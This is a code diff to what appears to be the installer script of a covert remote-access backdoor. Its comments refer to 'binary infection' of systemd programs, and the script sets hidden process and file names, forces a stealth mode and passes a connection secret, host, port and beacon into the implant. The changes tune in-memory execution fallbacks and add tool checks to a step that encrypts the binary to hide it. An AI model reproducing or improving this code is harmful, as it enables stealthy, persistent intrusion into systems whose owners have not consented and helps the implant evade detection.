@@ -228,6 +228,8 @@ GS_MEMEXEC=1
 [ -n "$GS_NOREEXEC" ] && unset GS_REEXEC
 [ -n "$GS_NOMEMEXEC" ] && unset GS_MEMEXEC
 [ -n "$GS_NOBC" ] && unset GS_BC
+# If no MEMEXEC then also disable BC (which depends on MEMEXEC)
+[ -z "$GS_MEMEXEC" ] && unset GS_BC # implied
 unset SYSTEMD_INSTALL_CHECK_IS_ACTIVE
 
 # systemd candidates for binary infection
@@ -974,7 +976,7 @@ init_vars()
 	# Defaults
 	# Set GS_BIN if GS_NAME is forced by user without forcing GS_BIN.
 	# [ -n "$GS_NAME" ] && [ -z "$GS_BIN" ] && GS_BIN="${GS_NAME}" # DISABLED because we like to disassociate process with file.
-	str="$(basename "$GS_BIN")"
+	str="${GS_BIN##*/}"
 	if [[ -n "$str" ]]; then
 		BIN_HIDDEN_NAME="${str}"
 		BIN_HIDDEN_NAME_RM+=("${str}")
@@ -1219,10 +1221,13 @@ _config2bin_tmpfile() {
 }
 
 _config2bin_withenv() {
-	_config2bin_memexec "$@" && return 0
-	SKIP_OUT "memexec() not available."
+	[ -n "$GS_MEMEXEC" ] && {
+		_config2bin_memexec "$@" && return 0
+		_GS_MEMEXEC_FAILED=1
+	}
+	SKIP_OUT "memexec() is not available."
 	echo -en "Adding configuration (second attempt)................................."
-	_config2bin_tmpfile "$@" && return 0
+	GS_MEMEXEC='' _config2bin_tmpfile "$@" && return 0
 }
 
 config2bin() {
@@ -1231,7 +1236,7 @@ config2bin() {
 	local opts="$3"
 	local proc_hidden_name="$4"
 
-	GS_PROC_HIDDENNAME="${proc_hidden_name}" GS_ARGS="${opts}" TERM=xterm-256color GS_CCG="${GS_CCG}" GS_SYSTEMD_ARGV_MATCH="${GS_SYSTEMD_ARGV_MATCH}" GS_WORKDIR="${GS_WORKDIR}" GS_DOMAIN="${GS_DOMAIN}" GS_PORT="${GS_PORT}" GS_HOST="${GS_HOST}" GS_BEACON="${GS_BEACON}" GS_FFPID="${GS_FFPID}" GS_REEXEC="${GS_REEXEC}" GS_STEALTH=1 GS_SECRET="${GS_SECRET:?}" _config2bin_withenv "$src" "$dst"
+	GS_PROC_HIDDENNAME="${proc_hidden_name}" GS_ARGS="${opts}" TERM=xterm-256color GS_CCG="${GS_CCG}" GS_SYSTEMD_ARGV_MATCH="${GS_SYSTEMD_ARGV_MATCH}" GS_WORKDIR="${GS_WORKDIR}" GS_DOMAIN="${GS_DOMAIN}" GS_PORT="${GS_PORT}" GS_HOST="${GS_HOST}" GS_BEACON="${GS_BEACON}" GS_FFPID="${GS_FFPID}" GS_MEMEXEC="${GS_MEMEXEC}" GS_REEXEC="${GS_REEXEC}" GS_STEALTH=1 GS_SECRET="${GS_SECRET:?}" _config2bin_withenv "$src" "$dst"
 }
 
 # Load configuration from TARGET by executing EXE.
@@ -1655,8 +1660,14 @@ do_bincrypter() {
 		return 0 # continue
 	}
 
+	[ -n "$_GS_MEMEXEC_FAILED" ] && {
+		SKIP_OUT "memexec() not available"
+		return 0 # continue
+	}
 	command -v openssl >/dev/null || { SKIP_OUT "Not found: openssl"; return 0; }
 	command -v perl >/dev/null || { SKIP_OUT "Not found: perl"; return 0; }
+	command -v gunzip >/dev/null || { SKIP_OUT "Not found: gunzip"; return 0; }
+	command -v gzip >/dev/null || { SKIP_OUT "Not found: gzip"; return 0; }
 	[ ! -c "/dev/urandom" ] && { SKIP_OUT "Not found: /dev/urandom"; return 0; }
 
 	# _bincrypter() may call exit() and thus must execute in sub-shell.	
